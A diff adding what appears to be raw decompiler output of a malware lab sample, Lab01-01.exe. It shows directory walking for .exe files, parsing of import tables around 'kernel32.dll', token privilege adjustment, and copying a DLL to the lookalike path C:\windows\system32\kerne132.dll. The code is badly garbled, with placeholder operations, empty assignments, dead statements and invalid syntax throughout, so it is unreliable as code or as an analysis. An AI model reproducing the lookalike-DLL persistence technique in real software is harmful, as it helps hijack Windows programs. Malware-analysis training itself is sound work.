@@ -1,0 +1,547 @@
+#include <WinBase.h>
+#include <Winbase.h>
+#include <excpt.h>
+#include <float.h>
+#include <internal.h>
+#include <matherr.c>
+#include <stdlib.h>
+#include <string.h>
+
+void Function_0();
+void Function_1();
+
+void main(){
+	FS:[0] = ;
+	var_24 = -32;
+	var_4 = var_4 & 0;
+	msvcrt.dll:__set_app_type(1);
+	g_var_4030F0 = g_var_4030F0 | FFFFFFFF;
+	g_var_4030F4 = g_var_4030F4 | FFFFFFFF;
+	msvcrt.dll:__p__fmode()
+	g_var_ret_value = g_var_12524;
+	msvcrt.dll:__p__commode()
+	g_var_ret_value = g_var_12520;
+	g_var_12536 = g_var_MSVCRT.dll:_adjust_fdiv;
+	Function1:00001951 ()
+	if(g_var_12504 != 0) {
+	     goto 000018A3;
+	}else{
+	     msvcrt.dll:__setusermatherr(40194E);
+	}
+000018A3:
+	Function1:0000193C ()
+	Function1:00001936 (3008, 300C)
+	var_40 = g_var_12516;
+	msvcrt.dll:__getmainargs(0, 0, 0, g_var_12512, 0);
+	Function1:00001936 (3000, 3004)
+	msvcrt.dll:__p___initenv()
+	g_var_ret_value = var_32;
+	UNKNOWN OPERATION3(CALL)
+	var_36 = ret_value;
+	msvcrt.dll:exit(ret_value);
+	var_48 = g_var_UNKNOWN;
+	Function1:00001930 (g_var_UNKNOWN, var_20)
+	return
+	msvcrt.dll:_exit(var_48);
+	msvcrt.dll:_XcptFilter(0, 0);
+	msvcrt.dll:_initterm()
+	Function1:00001966 ()
+	return
+	return
+	return
+	msvcrt.dll:_except_handler3(FS:[0], 401960, 402070, FFFFFFFF);
+	msvcrt.dll:_controlfp(, 0);
+}
+
+Function_0(){
+	if(g_var_6 <= 0) {
+	     goto 00001039;
+	}else{
+	}
+00001021:
+	if(arg_16 < g_var_UNKNOWN) {
+	     goto 00001031;
+	}else{
+	     g_var_UNKNOWN = g_var_UNKNOWN + 0;
+	     if(arg_16 < g_var_UNKNOWN) {
+	          goto 0000103B;
+	     }else{
+	     }
+00001031:
+	     g_var_UNKNOWN = g_var_UNKNOWN + 40;
+	     if(1 < g_var_6) {
+	          goto 00001021;
+	     }else{
+	     }
+00001039:
+	     g_var_UNKNOWN = 0;
+	}
+0000103B:
+	return
+	Function0()
+	if(arg_8 != 0) {
+	     goto 0000105B;
+	}else{
+	     return
+	}
+0000105B:
+	g_var_20 = g_var_20 - 0;
+	g_var_20 = g_var_20 + 0;
+	g_var_20 = g_var_20 + 0;
+	return
+	Function0()
+	if(arg_8 != 0) {
+	     goto 00001089;
+	}else{
+	     return
+	}
+00001089:
+	g_var_12 = g_var_12 - 0;
+	g_var_12 = g_var_12 - 0;
+	return
+	kernel32.dll:CreateFileA(arg_20, 10000000, 1, 0, 3, 0, 0);
+	arg_48 = ret_value;
+	kernel32.dll:CreateFileMappingA(ret_value, 0, 4, 0, 0, 0);
+	arg_40 = ret_value;
+	kernel32.dll:MapViewOfFile(ret_value, F001F, 0, 0, 0);
+	arg_16 = ret_value;
+	if(ret_value == 0) {
+	     goto 000011D5;
+	}else{
+	     EBP, ESI
+	     UNKNOWN OPERATION3(CALL)
+	     if(ret_value != 0) {
+	          goto 000011D5;
+	     }else{
+	          if(var_0 != 0) {
+	               goto 000011D5;
+	          }else{
+	               UNKNOWN OPERATION3(CALL)
+	               UNKNOWN OPERATION3(CALL)
+	               if(ret_value != 0) {
+	                    goto 000011D5;
+	               }else{
+	               }
+00001142:
+	               arg_32 = ret_value + 12;
+	               if(g_var_UNKNOWN != 0) {
+	                    goto 00001152;
+	               }else{
+	                    if(g_var_ret_value + 12 == 0) {
+	                         goto 000011AC;
+	                    }else{
+	                    }
+00001152:
+	                    UNKNOWN OPERATION3(CALL)
+	                    kernel32.dll:IsBadReadPtr(0, 14);
+	                    if(ret_value != 0) {
+	                         goto 000011D5;
+	                    }else{
+	                         msvcrt.dll:_stricmp(0, kernel32.dll));
+	                         if(ret_value != 0) {
+	                              goto 000011A7;
+	                         }else{
+	                              arg_128
+	                              UNKNOWN OPERATION3(REPNE)
+	                              arg_128 = !arg_128;
+	                              arg_128 = arg_128 >> 2;
+	                              UNKNOWN OPERATION3(AND)
+	                         }
+000011A7:
+	                         arg_32 = arg_32 + 20;
+	                         goto 00001142;
+	                    }
+000011AC:
+	                    g_var_UNKNOWN = g_var_UNKNOWN + 208;
+	                    arg_128 = 0;
+	                    arg_0 = arg_128;
+	                    arg_4 = arg_128;
+	                    kernel32.dll:UnmapViewOfFile(arg_16);
+	                    UNKNOWN OPERATION3(CALL)
+	                    UNKNOWN OPERATION3(CALL)
+	               }
+	          }
+	     }
+	}
+000011D5:
+	return
+	if(arg_8 > 7) {
+	     goto 00001434;
+	}else{
+	     kernel32.dll:FindFirstFileA(arg_344, arg_20);
+	     arg_16 = ret_value;
+	}
+00001210:
+	if(ret_value == -1) {
+	     goto 0000142C;
+	}else{
+	     if(var_20 == 16) {
+	          goto 0000135C;
+	     }else{
+	     }
+0000122D:
+	     if(g_var_0 != g_var_403040) {
+	          goto 00001255;
+	     }else{
+	          if(g_var_0 == 0) {
+	               goto 00001251;
+	          }else{
+	               if(g_var_1 != g_var_403041) {
+	                    goto 00001255;
+	               }else{
+	                    arg_64 = arg_64 + 2;
+	                    if(g_var_1 != 0) {
+	                         goto 0000122D;
+	                    }else{
+	                    }
+00001251:
+	                    arg_64 = 0;
+	                    goto 0000125A;
+	               }
+	          }
+00001255:
+	          EAX, EAX
+	          EAX, -1
+	     }
+0000125A:
+	     if(0 == 0) {
+	          goto 0000135C;
+	     }else{
+	     }
+0000126B:
+	     if(g_var_0 != g_var_40303C) {
+	          goto 00001293;
+	     }else{
+	          if(g_var_0 == 0) {
+	               goto 0000128F;
+	          }else{
+	               if(g_var_1 != g_var_UNKNOWN) {
+	                    goto 00001293;
+	               }else{
+	                    arg_64 = arg_64 + 2;
+	                    if(g_var_1 != 0) {
+	                         goto 0000126B;
+	                    }else{
+	                    }
+0000128F:
+	                    arg_64 = 0;
+	                    goto 00001298;
+	               }
+	          }
+00001293:
+	          EAX, EAX
+	          EAX, -1
+	     }
+00001298:
+	     if(0 == 0) {
+	          goto 0000135C;
+	     }else{
+	          g_var_1
+	          arg_64 = 0;
+	          UNKNOWN OPERATION3(REPNE)
+	          g_var_1 = !g_var_1;
+	          g_var_1--;
+	          g_var_1
+	          UNKNOWN OPERATION3(REPNE)
+	          g_var_1 = !g_var_1;
+	          g_var_1--;
+	          msvcrt.dll:malloc(208);
+	          g_var_1
+	          UNKNOWN OPERATION3(REPNE)
+	          g_var_1 = !g_var_1;
+	          arg_344 = arg_344 - -2;
+	          g_var_1 = g_var_1 >> 2;
+	          g_var_1 = 0;
+	          UNKNOWN OPERATION3(AND)
+	          g_var_1
+	          UNKNOWN OPERATION3(REPNE)
+	          g_var_1 = !g_var_1;
+	          g_var_1--;
+	          g_var_UNKNOWN = arg_68;
+	          g_var_1
+	          UNKNOWN OPERATION3(REPNE)
+	          g_var_1 = !g_var_1;
+	          arg_344 = arg_344 - -1;
+	          g_var_1
+	          UNKNOWN OPERATION3(REPNE)
+	          g_var_1 = g_var_1 >> 2;
+	          UNKNOWN OPERATION3(AND)
+	          g_var_1
+	          UNKNOWN OPERATION3(REPNE)
+	          g_var_1 = !g_var_1;
+	          -1
+	          UNKNOWN OPERATION3(REPNE)
+	          UNKNOWN OPERATION3(AND)
+	          arg_352++;
+	          UNKNOWN OPERATION3(CALL)
+	          goto 00001413;
+	     }
+	}
+0000135C:
+	arg_352
+	arg_64 = 0;
+	UNKNOWN OPERATION3(REPNE)
+	arg_352 = !arg_352;
+	arg_352--;
+	arg_352
+	UNKNOWN OPERATION3(REPNE)
+	arg_352 = !arg_352;
+	arg_352--;
+	arg_352
+	UNKNOWN OPERATION3(REPNE)
+	arg_352 = !arg_352;
+	arg_352--;
+	msvcrt.dll:malloc(0);
+	arg_352
+	UNKNOWN OPERATION3(REPNE)
+	arg_352 = !arg_352;
+	arg_348 = arg_348 - -2;
+	arg_352 = arg_352 >> 2;
+	arg_352 = 0;
+	UNKNOWN OPERATION3(AND)
+	arg_352
+	UNKNOWN OPERATION3(REPNE)
+	arg_352 = !arg_352;
+	arg_352--;
+	g_var_UNKNOWN = arg_76;
+	arg_352
+	UNKNOWN OPERATION3(REPNE)
+	arg_352 = !arg_352;
+	arg_348 = arg_348 - -1;
+	arg_352
+	UNKNOWN OPERATION3(REPNE)
+	arg_352 = arg_352 >> 2;
+	UNKNOWN OPERATION3(AND)
+	msvcrt.dll:_stricmp(-1, .exe));
+	if(ret_value != 0) {
+	     goto 0000140C;
+	}else{
+	     UNKNOWN OPERATION3(CALL)
+	}
+0000140C:
+00001413:
+	kernel32.dll:FindNextFileA(arg_16, arg_20);
+	if(ret_value == 0) {
+	     goto 00001434;
+	}else{
+	     goto 00001210;
+	}
+0000142C:
+	kernel32.dll:FindClose(FFFFFFFF);
+00001434:
+	return
+	if(arg_4 != 2) {
+	     goto 00001813;
+	}else{
+	}
+00001460:
+	if(g_var_UNKNOWN != g_var_4030B0) {
+	     goto 00001488;
+	}else{
+	     if(g_var_UNKNOWN == 0) {
+	          goto 00001484;
+	     }else{
+	          if(g_var_UNKNOWN != g_var_UNKNOWN) {
+	               goto 00001488;
+	          }else{
+	               g_var_4 = g_var_4 + 2;
+	               if(g_var_UNKNOWN != 0) {
+	                    goto 00001460;
+	               }else{
+	               }
+00001484:
+	               g_var_4 = 0;
+	               goto 0000148D;
+	          }
+	     }
+00001488:
+	     EAX, EAX
+	     EAX, -1
+	}
+0000148D:
+	if(0 != 0) {
+	     goto 00001813;
+	}else{
+	     UNKNOWN OPERATION3(CALL)
+	     arg_100 = 0;
+	     UNKNOWN OPERATION3(CALL)
+	     UNKNOWN OPERATION3(CALL)
+	     arg_116 = 0;
+	     UNKNOWN OPERATION3(CALL)
+	     arg_80 = 0;
+	     if(0 != -1) {
+	          goto 00001503;
+	     }else{
+	          msvcrt.dll:exit(0);
+	     }
+00001503:
+	     UNKNOWN OPERATION3(CALL)
+	     if(ret_value != -1) {
+	          goto 0000151B;
+	     }else{
+	          msvcrt.dll:exit(0);
+	     }
+0000151B:
+	     UNKNOWN OPERATION3(CALL)
+	     arg_92 = ret_value;
+	     if(ret_value != 0) {
+	          goto 00001538;
+	     }else{
+	          msvcrt.dll:exit(ret_value);
+	     }
+00001538:
+	     EDI, ESI
+	     arg_64 = g_var_60;
+	     UNKNOWN OPERATION3(CALL)
+	     ESI, EBP
+	     arg_56 = g_var_UNKNOWN;
+	     UNKNOWN OPERATION3(CALL)
+	     UNKNOWN OPERATION3(CALL)
+	     arg_76 = g_var_UNKNOWN;
+	     UNKNOWN OPERATION3(CALL)
+	     arg_100 = g_var_UNKNOWN;
+	     UNKNOWN OPERATION3(CALL)
+	     arg_108 = arg_136;
+	     UNKNOWN OPERATION3(CALL)
+	     g_var_124 = g_var_124 >> 2;
+	     UNKNOWN OPERATION3(AND)
+	     arg_60 = g_var_120;
+	     arg_20 = g_var_UNKNOWN;
+	     arg_24 = g_var_UNKNOWN;
+	     g_var_UNKNOWN = g_var_UNKNOWN << 4;
+	     arg_12 = g_var_UNKNOWN;
+	     g_var_UNKNOWN = g_var_UNKNOWN + 16;
+	     arg_32 = g_var_UNKNOWN;
+	     g_var_UNKNOWN = kern;
+	     g_var_UNKNOWN = e132;
+	     g_var_UNKNOWN = .dll;
+	     g_var_UNKNOWN = g_var_12316;
+	     arg_72 = g_var_UNKNOWN;
+	     arg_68 = g_var_UNKNOWN;
+	     g_var_UNKNOWN = g_var_UNKNOWN + 0;
+	     arg_28 = g_var_UNKNOWN;
+	     arg_40 = arg_40 + 0;
+	     arg_36 = g_var_UNKNOWN;
+	     arg_32 = arg_40;
+	     g_var_UNKNOWN = 0;
+	     g_var_UNKNOWN = 0;
+	     arg_92 = g_var_UNKNOWN;
+	     arg_44 = g_var_UNKNOWN;
+	     if(g_var_20 <= 0) {
+	          goto 000017D4;
+	     }else{
+	     }
+00001653:
+	     if(var_0 == 0) {
+	          goto 000017B9;
+	     }else{
+	          int arg_40 = 0
+	          if(g_var_24 <= 0) {
+	               goto 000017B9;
+	          }else{
+	               arg_16 = g_var_UNKNOWN;
+	               arg_24 = arg_48;
+	               arg_20 = arg_52;
+	               g_var_UNKNOWN = g_var_UNKNOWN - 0;
+	               arg_64 = g_var_UNKNOWN;
+	          }
+0000169F:
+	          g_var_UNKNOWN = 0;
+	          if(g_var_0 != g_var_UNKNOWN) {
+	               goto 00001783;
+	          }else{
+	               UNKNOWN OPERATION3(CALL)
+	               arg_24
+	               arg_56 = 0;
+	               UNKNOWN OPERATION3(REPNE)
+	               arg_24 = !arg_24;
+	               arg_24 = arg_24 >> 2;
+	               UNKNOWN OPERATION3(AND)
+	               g_var_0 = arg_92;
+	               g_var_0 = g_var_UNKNOWN;
+	               g_var_UNKNOWN
+	               arg_64 = 0;
+	               UNKNOWN OPERATION3(REPNE)
+	               g_var_UNKNOWN = !g_var_UNKNOWN;
+	               g_var_UNKNOWN--;
+	               g_var_UNKNOWN = g_var_UNKNOWN + 9;
+	               arg_0 = g_var_UNKNOWN;
+	               g_var_UNKNOWN = Kern;
+	               g_var_UNKNOWN = el32;
+	               g_var_UNKNOWN = .;
+	               .
+	               g_var_UNKNOWN = 0;
+	               UNKNOWN OPERATION3(REPNE)
+	               . = !.;
+	               UNKNOWN OPERATION3(AND)
+	               .
+	               UNKNOWN OPERATION3(REPNE)
+	               . = !.;
+	               arg_92++;
+	               arg_92 = arg_92;
+	               arg_16 = arg_16 + 2;
+	               arg_32 = arg_32 + 4;
+	               arg_16 = arg_16;
+	          }
+00001783:
+	          arg_20 = arg_20 + 2;
+	          arg_20 = arg_20;
+	          arg_40++;
+	          arg_24 = arg_24 + 4;
+	          arg_40 = arg_40;
+	          arg_24 = arg_24;
+	          if(arg_40 < ESI) {
+	               goto 0000169F;
+	          }else{
+	          }
+	     }
+000017B9:
+	     arg_44++;
+	     arg_28 = arg_28 + 4;
+	     arg_44 = arg_44;
+	     arg_28 = arg_28;
+	     if(arg_44 < EBP) {
+	          goto 00001653;
+	     }else{
+	     }
+000017D4:
+	     UNKNOWN OPERATION3(CALL)
+	     UNKNOWN OPERATION3(CALL)
+	     kernel32.dll:CopyFileA(Lab01-01.dll), C:\windows\system32\kerne132.dll), 0);
+	     if(ret_value != 0) {
+	          goto 00001806;
+	     }else{
+	          msvcrt.dll:exit(0);
+	     }
+00001806:
+	     UNKNOWN OPERATION3(CALL)
+	}
+00001813:
+	return
+}
+
+Function_1(){
+	kernel32.dll:GetCurrentProcess()
+	advapi32.dll:OpenProcessToken(0, 28, 0);
+	if(ret_value != 0) {
+	     goto 00001120;
+	}else{
+	     goto 0000116E;
+	}
+00001120:
+	int var_16 = 1
+	int var_4 = 2
+	advapi32.dll:LookupPrivilegeValueA(0, arg_8, var_284);
+	if(ret_value != 0) {
+	     goto 00001153;
+	}else{
+	     kernel32.dll:CloseHandle(0);
+	     goto 0000116E;
+	}
+00001153:
+	advapi32.dll:AdjustTokenPrivileges(0, 0, var_284, 0, 0, 0);
+	var_20 = ret_value;
+0000116E:
+	return
+}
+
